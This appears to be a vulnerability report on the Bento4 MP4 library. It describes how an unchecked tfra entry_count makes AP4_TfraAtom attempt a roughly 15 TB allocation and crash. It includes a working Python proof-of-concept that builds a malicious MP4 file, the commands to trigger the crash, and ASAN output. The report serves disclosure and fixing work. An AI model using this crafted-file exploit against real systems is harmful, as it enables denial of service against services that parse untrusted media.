## Bug0: AP4_TfraAtom Unchecked entry_count Causes Unbounded Memory Allocation

In `AP4_TfraAtom::AP4_TfraAtom()` in `Ap4TfraAtom.cpp`, the constructor passes the file-controlled `entry_count` field directly to `m_Entries.SetItemCount(entry_count)` without any bounds check, causing an attempt to allocate up to ~15 TB of heap memory and crashing the process with `std::bad_alloc`.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC Generator — AP4_TfraAtom Unchecked entry_count
Triggers huge allocation via SetItemCount(0x10000000) -> bad_alloc / DoS
"""
import struct

OUT_FILE = "poc_input.mp4"


def box(box_type: bytes, payload: bytes) -> bytes:
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def make_ftyp() -> bytes:
    payload = b"isom" + struct.pack(">I", 0) + b"isom"
    return box(b"ftyp", payload)


def make_mvhd() -> bytes:
    payload = (
        struct.pack(">I", 0)
        + struct.pack(">I", 0)
        + struct.pack(">I", 0)
        + struct.pack(">I", 1000)
        + struct.pack(">I", 0)
        + struct.pack(">I", 0x00010000)
        + struct.pack(">H", 0x0100)
        + b"\x00" * 10
        + struct.pack(">9I",
                      0x00010000, 0, 0,
                      0, 0x00010000, 0,
                      0, 0, 0x40000000)
        + b"\x00" * 24
        + struct.pack(">I", 2)
    )
    return box(b"mvhd", payload)


def make_moov() -> bytes:
    return box(b"moov", make_mvhd())


def make_tfra() -> bytes:
    payload = (
        b"\x00"
        + b"\x00\x00\x00"
        + struct.pack(">I", 1)
        + struct.pack(">I", 0x00000000)
        + struct.pack(">I", 0x10000000)  # entry_count = 268435456 -- the trigger
        # No entry bytes -- parser allocates before reading entries
    )
    return box(b"tfra", payload)


def make_mfro(mfra_size: int) -> bytes:
    payload = struct.pack(">I", mfra_size)
    return box(b"mfro", payload)


def make_mfra() -> bytes:
    tfra = make_tfra()
    mfra_size = 8 + len(tfra) + 16
    mfro = make_mfro(mfra_size)
    return box(b"mfra", tfra + mfro)


def main():
    ftyp = make_ftyp()
    moov = make_moov()
    mfra = make_mfra()

    data = ftyp + moov + mfra

    with open(OUT_FILE, "wb") as f:
        f.write(data)

    print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
    print(f"    tfra entry_count = 0x10000000 ({0x10000000} entries)")
    print(f"    Expected: bad_alloc / abort when mp42aac parses mfra/tfra")


if __name__ == "__main__":
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (512Mb vs 546Mb)
ERROR: AddressSanitizer failed to allocate 0xdfff0001000 (15392894357504) bytes at address 2008fff7000 (errno: 12)
Process exit: SIGABRT (signal 6) with exit code 134. The crash occurs in AP4_TfraAtom::AP4_TfraAtom() at Ap4TfraAtom.cpp:88 when SetItemCount(0x10000000) attempts a ~15 TB heap allocation.

### Impact

An attacker can cause unconditional denial of service by supplying a single crafted MP4 file containing a tfra box with an inflated `entry_count` field, crashing any process that invokes mp42aac or any application linked against the Bento4 library to parse MP4 files. The attack surface is any invocation of mp42aac on an untrusted MP4 file, with no authentication or special privileges required. On allocators that do not throw `std::bad_alloc`, the ignored return value of `SetItemCount` could lead to subsequent out-of-bounds writes into a null or undersized buffer, potentially enabling memory corruption beyond a pure denial of service.
